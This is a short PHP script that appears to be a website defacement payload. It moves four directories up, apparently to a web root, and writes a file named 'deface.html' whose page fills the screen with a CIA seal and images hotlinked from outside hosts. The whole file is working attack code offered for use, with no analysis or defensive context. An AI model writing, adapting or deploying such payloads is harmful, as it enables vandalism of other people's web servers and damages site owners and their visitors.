<?php

chdir("../../../../");

$html_file = fopen("deface.html", "w");

$html = <<<HTML
<html>
    <head>
		<style type="text/css">
		body {
		   margin: 0;
		   overflow: auto;
		}
		#img1 {
		    position:absolute;
		    left: 0px;
		    width: 100%;
		    top: 0px;
		    height: 100%;
            object-fit: cover;
		}
		</style>
	</head> 
<body>

    <img id="img1"src="https://upload.wikimedia.org/wikipedia/commons/5/5a/CIA_floor_seal.png"/>
    <img style="position: relative; top: 100px; left:33%"src="http://snowdenfanboys.puppies.chatzi.org/snowden_2.gif"/>
    <img style="position: relative; top: 250px; left: -2%;"src="http://snowdenfanboys.puppies.chatzi.org/privacy.gif"/>
    <img style="position: relative; top: 300px; left:33%" src="https://external-preview.redd.it/opjELhlaWauF4u1v6MnpFptFUgg9AEUkiVmszIOMYQk.jpg?auto=webp&s=30b46b6074bc055050fa475deb70fbe05575169c"/>

</body>
</html>

HTML;

fwrite($html_file, $html);
fclose($html_file);

?>